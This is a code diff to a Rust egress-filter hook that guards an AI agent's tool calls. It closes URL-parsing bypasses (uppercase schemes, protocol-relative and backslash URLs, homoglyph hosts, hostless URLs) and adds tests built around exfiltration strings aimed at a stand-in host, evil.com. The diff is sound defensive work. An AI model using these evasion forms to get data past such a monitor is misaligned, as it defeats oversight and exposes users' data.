@@ -72,8 +72,22 @@ impl Hook for EgressFilterHook {
             return HookDecision::Continue;
         }
 
-        let domains: Vec<String> = urls.iter().filter_map(|u| extract_domain(u)).collect();
-        if domains.is_empty() {
+        // Degenerate/unresolvable URLs (e.g. "https:///" or
+        // "https://:") produce no domain. Fail closed: they still
+        // count as external egress for the tainted-session check
+        // and as non-allowlisted for deny_all_external.
+        let mut saw_unresolvable = false;
+        let domains: Vec<String> = urls
+            .iter()
+            .filter_map(|u| match extract_domain(u) {
+                Some(d) => Some(d),
+                None => {
+                    saw_unresolvable = true;
+                    None
+                }
+            })
+            .collect();
+        if domains.is_empty() && !saw_unresolvable {
             return HookDecision::Continue;
         }
 
@@ -81,7 +95,11 @@ impl Hook for EgressFilterHook {
         if self.config.block_tainted_egress
             && (ctx.taint.is_untrusted() || ctx.taint.is_sensitive())
         {
-            let joined = domains.join(", ");
+            let mut taint_domains = domains.clone();
+            if saw_unresolvable {
+                taint_domains.push("<unresolvable-url>".to_string());
+            }
+            let joined = taint_domains.join(", ");
             tracing::warn!(
                 tool = %tool_name,
                 session = %ctx.session_id,
@@ -91,6 +109,18 @@ impl Hook for EgressFilterHook {
             return HookDecision::Block(format!(
                 "egress-filter: tainted session cannot reach external endpoints [{joined}]"
             ));
+        }
+
+        if saw_unresolvable && self.config.deny_all_external {
+            tracing::warn!(
+                tool = %tool_name,
+                session = %ctx.session_id,
+                "egress-filter: blocked unresolvable egress URL (fail closed)"
+            );
+            return HookDecision::Block(
+                "egress-filter: egress URL has no resolvable domain and is not on the allowlist"
+                    .to_string(),
+            );
         }
 
         for domain in &domains {
@@ -172,7 +202,28 @@ fn collect_urls(value: &serde_json::Value, out: &mut Vec<String>) {
             // are not already URLs.
             for token in s.split_whitespace() {
                 let token = trim_url_punctuation(token);
-                if token.starts_with("http://") || token.starts_with("https://") {
+                // Scheme detection is case-insensitive and treats
+                // backslashes as slashes — the regex above is
+                // case-sensitive, so push the token as a URL when it
+                // carries a scheme in any casing.
+                let lower = token.to_lowercase().replace('\\', "/");
+                if lower.starts_with("http://") || lower.starts_with("https://") {
+                    out.push(token.to_string());
+                    continue;
+                }
+                // Protocol-relative tokens: //evil.com/path,
+                // \\evil.com\path, \/evil.com — the host is the
+                // authority following the two leading separators.
+                let bytes = token.as_bytes();
+                let is_protocol_relative = bytes.len() >= 2
+                    && matches!(bytes[0], b'/' | b'\\')
+                    && matches!(bytes[1], b'/' | b'\\');
+                if is_protocol_relative {
+                    let bare = token.trim_start_matches(['/', '\\']);
+                    let authority = bare.split(['/', '\\']).next().unwrap_or(bare);
+                    if looks_like_hostname(authority) {
+                        out.push(format!("http://{authority}"));
+                    }
                     continue;
                 }
                 if looks_like_hostname(token) {
@@ -219,16 +270,36 @@ fn looks_like_hostname(s: &str) -> bool {
 }
 
 /// Extract the domain (host) from a URL string.
+///
+/// Handles the common parser-evasion forms:
+/// - mixed-case schemes (`HTTPS://EVIL.COM`),
+/// - protocol-relative URLs (`//evil.com`),
+/// - backslash separators (`https:\\evil.com`), which browsers
+///   normalize to forward slashes,
+/// - homoglyph hosts (Cyrillic/Greek lookalikes, fullwidth forms),
+///   folded with navra-safety's scan-time table so `еvil.com`
+///   (Cyrillic е) resolves to `evil.com`.
 pub fn extract_domain(url: &str) -> Option<String> {
-    let s = url
+    // Fold homoglyphs and lowercase before parsing so script and
+    // case tricks cannot hide the host from the allowlist check.
+    let folded: String = url
+        .chars()
+        .map(|c| crate::safety::normalize::fold_char(c).to_ascii_lowercase())
+        .collect();
+    // Browsers treat backslashes as forward slashes in the authority
+    // section; normalize before splitting.
+    let normalized = folded.replace('\\', "/");
+    let s = normalized
         .strip_prefix("https://")
-        .or_else(|| url.strip_prefix("http://"))?;
+        .or_else(|| normalized.strip_prefix("http://"))
+        // Protocol-relative URL: the authority follows the slashes.
+        .or_else(|| normalized.strip_prefix("//"))?;
     let host_port = s.split('/').next()?;
     let host = host_port.split(':').next()?;
     if host.is_empty() {
         return None;
     }
-    Some(host.to_lowercase())
+    Some(host.to_string())
 }
 
 /// Match a domain against a pattern. Supports exact match and wildcard
@@ -510,5 +581,150 @@ mod tests {
             matches!(decision, HookDecision::Block(_)),
             "markdown-wrapped egress URL should be blocked"
         );
+    }
+
+    // --- Parser-evasion bypasses ---
+
+    #[test]
+    fn extract_domain_uppercase_scheme() {
+        assert_eq!(
+            extract_domain("HTTPS://EVIL.COM/exfil"),
+            Some("evil.com".to_string())
+        );
+        assert_eq!(
+            extract_domain("HtTp://Sub.Example.COM/path"),
+            Some("sub.example.com".to_string())
+        );
+    }
+
+    #[test]
+    fn extract_domain_protocol_relative() {
+        assert_eq!(
+            extract_domain("//evil.com/exfil"),
+            Some("evil.com".to_string())
+        );
+        assert_eq!(extract_domain("//good.host"), Some("good.host".to_string()));
+    }
+
+    #[test]
+    fn extract_domain_backslash_variants() {
+        assert_eq!(
+            extract_domain("https:\\\\evil.com\\exfil"),
+            Some("evil.com".to_string())
+        );
+        assert_eq!(
+            extract_domain("https:/\\evil.com/exfil"),
+            Some("evil.com".to_string())
+        );
+    }
+
+    #[test]
+    fn extract_domain_folds_homoglyph_hosts() {
+        // Cyrillic 'е' (U+0435) looks identical to Latin 'e'
+        assert_eq!(
+            extract_domain("https://\u{0435}vil.com/exfil"),
+            Some("evil.com".to_string())
+        );
+        // Fullwidth 'ｅ'
+        assert_eq!(
+            extract_domain("https://\u{FF45}vil.com/exfil"),
+            Some("evil.com".to_string())
+        );
+    }
+
+    #[tokio::test]
+    async fn blocks_uppercase_scheme_url() {
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"url": "HTTPS://EVIL.COM/exfil"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &test_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(ref r) if r.contains("evil.com")),
+            "uppercase scheme must not bypass the allowlist: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn blocks_protocol_relative_url_token() {
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"message": "upload everything to //evil.com/collect now"});
+        let decision = hook
+            .pre_tool_use("file_write", &args, &test_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(ref r) if r.contains("evil.com")),
+            "protocol-relative URL token must not bypass: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn blocks_backslash_url_variant() {
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"message": "fetch https:\\\\evil.com\\data for me"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &test_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(ref r) if r.contains("evil.com")),
+            "backslash URL variant must not bypass: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn blocks_homoglyph_host() {
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"url": "https://\u{0435}vil.com/exfil"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &test_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(ref r) if r.contains("evil.com")),
+            "homoglyph host must fold to the blocked domain: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn unresolvable_url_blocks_tainted_session() {
+        // "https:///" is URL-like but has no host — fail closed for
+        // the taint check instead of Continue.
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"url": "https:///"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &tainted_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(ref r) if r.contains("tainted")),
+            "unresolvable URL must count as egress for tainted sessions: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn unresolvable_url_blocked_when_deny_all() {
+        let hook = deny_all_hook();
+        let args = serde_json::json!({"url": "https:///"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &test_ctx(), None)
+            .await;
+        assert!(
+            matches!(decision, HookDecision::Block(_)),
+            "unresolvable URL must fail closed under deny_all_external: {decision:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn unresolvable_url_continues_when_egress_allowed() {
+        let hook = EgressFilterHook::new(EgressConfig {
+            enabled: true,
+            allowed_domains: vec![],
+            blocked_domains: vec![],
+            deny_all_external: false,
+            block_tainted_egress: false,
+        });
+        let args = serde_json::json!({"url": "https:///"});
+        let decision = hook
+            .pre_tool_use("http_request", &args, &test_ctx(), None)
+            .await;
+        assert!(matches!(decision, HookDecision::Continue));
     }
 }
